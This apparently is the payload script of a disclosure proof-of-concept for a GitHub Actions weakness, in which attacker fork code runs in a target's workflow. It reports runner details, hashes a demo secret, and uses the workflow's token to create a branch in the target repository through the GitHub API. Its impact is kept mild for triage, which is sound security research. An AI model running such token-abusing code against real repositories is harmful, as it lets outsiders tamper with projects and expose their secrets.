#!/usr/bin/env bash
set -euo pipefail

echo "POC_MARKER=ATTACKER_FORK_CODE_EXECUTED"
echo "script_repository=StealthyBugs/actions-checkout-dotgit-poc-20261008"
echo "script_branch=poc/dotgit-alias"
echo "runner_user=$(id -un)"
echo "runner_os=${RUNNER_OS}"
echo "workflow_repository=${GITHUB_REPOSITORY}"
echo "workflow_event=${GITHUB_EVENT_NAME}"
echo "secret_present=$([[ -n "${TRIAGE_DEMO_SECRET:-}" ]] && echo true || echo false)"
printf 'secret_sha256='
printf '%s' "${TRIAGE_DEMO_SECRET:-}" | shasum -a 256 | awk '{print $1}'

proof_branch="poc/attacker-code-executed-${GITHUB_RUN_ID}"
base_sha=$(curl -sS \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer ${GH_TOKEN}" \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/ref/heads/main" | jq -r '.object.sha')
request_body=$(jq -cn --arg ref "refs/heads/${proof_branch}" --arg sha "${base_sha}" '{ref:$ref,sha:$sha}')

echo "> POST /repos/${GITHUB_REPOSITORY}/git/refs HTTP/1.1"
echo "> Host: api.github.com"
echo "> Accept: application/vnd.github+json"
echo "> Authorization: Bearer [GITHUB_TOKEN masked by Actions]"
echo "> Content-Type: application/json"
echo ">"
echo "> ${request_body}"

http_status=$(curl -sS -D write-response-headers.txt \
  -o write-response.json \
  -w '%{http_code}' \
  -X POST \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer ${GH_TOKEN}" \
  -H "Content-Type: application/json" \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs" \
  --data "${request_body}")

sed -n '1,20p' write-response-headers.txt
jq '{ref, object}' write-response.json
echo "write_status=${http_status}"
echo "proof_branch=${proof_branch}"
test "${http_status}" = "201"
